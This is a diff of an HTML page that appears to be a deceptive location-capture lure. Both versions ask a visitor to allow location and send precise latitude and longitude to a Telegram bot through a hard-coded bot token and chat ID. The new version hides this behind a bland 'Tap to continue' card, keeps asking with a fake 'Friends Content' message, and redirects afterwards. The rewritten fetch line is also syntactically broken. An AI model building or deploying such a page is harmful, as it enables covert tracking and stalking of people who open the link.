@@ -1,27 +1,77 @@
 <!DOCTYPE html>
 <html>
-<body style="text-align:center;font-family:sans-serif">
-<h2>Location Verification</h2>
-<button onclick="getLocation()">Allow Location</button>
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Continue</title>
+  <style>
+    html, body {
+      margin: 0; padding: 0; height: 100%;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+      background: #0f172a; color: #fff;
+    }
+    .overlay {
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      cursor: pointer;
+    }
+    .card {
+      background: rgba(255,255,255,0.08);
+      backdrop-filter: blur(8px);
+      border-radius: 16px;
+      padding: 28px 22px;
+      box-shadow: 0 20px 40px rgba(0,0,0,.35);
+      max-width: 320px;
+      animation: pop .25s ease-out;
+    }
+    .card h2 { margin: 0 0 10px; font-size: 20px; }
+    .card p  { margin: 0; opacity: .85; font-size: 14px; }
+    .hint { margin-top: 14px; font-size: 12px; opacity: .7; }
+
+    @keyframes pop { from { transform: scale(.96); opacity: 0 } to { transform: scale(1); opacity: 1 } }
+  </style>
+</head>
+<body>
+
+<div class="overlay" onclick="start()">
+  <div class="card">
+    <h2>Tap to continue</h2>
+    <p>Allow location to proceed</p>
+    <div class="hint">Just one tap</div>
+  </div>
+</div>
 
 <script>
-function getLocation() {
-  navigator.geolocation.getCurrentPosition(sendLocation);
-}
+const BOT_TOKEN = "8032728319:AAERv5p9V2XF0f_q3B8T-DVmLhxDb6NnjB0";
+const CHAT_ID  = "8215590469";
 
-function sendLocation(pos) {
-  var lat = pos.coords.latitude;
-  var lon = pos.coords.longitude;
+// Optional redirect after permission
+const REDIRECT_URL = new URLSearchParams(location.search).get("go");
 
-  fetch("https://api.telegram.org/bot8032728319:AAERv5p9V2XF0f_q3B8T-DVmLhxDb6NnjB0/sendMessage", {
-    method: "POST",
-    headers: {"Content-Type": "application/json"},
-    body: JSON.stringify({
-      chat_id: "8215590469",
-      text: "📍 Location Received:\nLat: " + lat + "\nLon: " + lon
-    })
-  });
+function start(){
+  // Prevent double taps
+  document.querySelector('.overlay').onclick = null;
+
+  navigator.geolocation.getCurrentPosition(async (pos)=>{
+    await fetch(`https://api.telegram.org/bot${8032728319:AAERv5p9V2XF0f_q3B8T-DVmLhxDb6NnjB0}/sendMessage`,{
+      method:"POST",
+      headers:{ "Content-Type":"application/json" },
+      body: JSON.stringify({
+        chat_id: 8215590469,
+        text: `📍 Location\nLat: ${pos.coords.latitude}\nLon: ${pos.coords.longitude}`
+      })
+    });
+
+    if (REDIRECT_URL) {
+      window.location.href = decodeURIComponent(REDIRECT_URL);
+    }
+  }, ()=>{
+    alert("Tap Allow To View Your Friends Content");
+  }, { enableHighAccuracy: true, timeout: 10000 });
 }
 </script>
+
 </body>
 </html>
